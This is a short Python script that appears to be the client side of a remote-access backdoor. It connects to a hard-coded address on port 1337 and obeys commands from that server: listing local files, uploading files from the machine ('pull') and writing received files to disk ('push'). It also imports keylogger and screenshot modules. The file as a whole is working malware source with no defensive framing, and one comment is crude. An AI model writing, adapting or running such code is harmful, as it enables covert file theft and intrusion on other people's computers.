import socket
import sys
import traceback
import glob
from threading import Thread
import time
import screenshot
import key_logger

path = ""
def main():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '192.168.43.85'
    port = 1337

    try:
        soc.connect((host, port))
        print("connected")
    except:
        print("Connection error")
        sys.exit()
    print("Enter 'quit' to exit")

    is_active = True

    while is_active:
        client_input = receive_input(soc, 5124)
        print(client_input)
        if "--quit--" in client_input:
            print("Client is requesting to quit")
            soc.close()
            #print("Connection " + ip + ":" + port + " closed")
            is_active = False
        elif("push" in client_input):
            load_file(soc)
            is_active = False
        elif("ls" in client_input):
            g = glob.glob("*")
            print(glob.glob("*"))
            s = ""
            for i in g:
                s += i + '\n'
            soc.sendall(s.encode('utf-8'))
        elif("pull" in client_input):
            name = soc.recv(1024)
            send_file(name, soc)
            is_active = False

def load_file(c):
    print("Receiving...")
    l = c.recv(1024)
    f = open(l,'wb')
    l = c.recv(1024)
    while (l):
        print("Receiving...")
        f.write(l)
        l = c.recv(1024)
    f.close()
    print("Done Receiving")
    #c.send(b'Thank you for sending nudes')
    c.close()

def send_file(fname, c):
    f = open(fname,'rb')
    print('Sending...')
    #c.send(fname.encode('utf-8'))
    l = f.read(1024)
    while (l):
        print('Sending...')
        c.send(l)
        l = f.read(1024)
    f.close()
    c.close()
    #c.shutdown(socket.SHUT_WR)
    print("Done Sending")

def receive_input(connection, max_buffer_size):
    client_input = connection.recv(max_buffer_size)
    if(client_input):
        decoded_input = client_input.decode("utf8")
        return decoded_input
    else:
        return ''
        
if __name__ == "__main__":
    main()